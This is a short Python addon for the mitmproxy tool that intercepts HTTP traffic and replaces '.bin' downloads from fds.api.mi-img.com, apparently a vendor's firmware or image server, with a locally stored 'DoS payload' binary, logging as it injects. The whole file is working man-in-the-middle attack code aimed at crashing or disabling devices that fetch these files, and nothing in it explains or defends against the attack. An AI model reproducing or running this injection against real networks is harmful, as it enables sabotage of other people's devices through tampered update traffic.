from mitmproxy import http, ctx

PAYLOAD = "bins/DOS_OFFSET_FF000000.bin"

class DoS:
    def __init__(self):
        with open(PAYLOAD, 'rb') as f:
            self.payload = f.read()
        ctx.log.warn("[+] DoS payload loaded")

    def response(self, flow: http.HTTPFlow):
        if "fds.api.mi-img.com" in flow.request.host and ".bin" in flow.request.pretty_url:
            ctx.log.warn("[!] INJECTING DoS PAYLOAD")
            flow.response.content = self.payload
            flow.response.headers["content-length"] = str(len(self.payload))

addons = [DoS()]
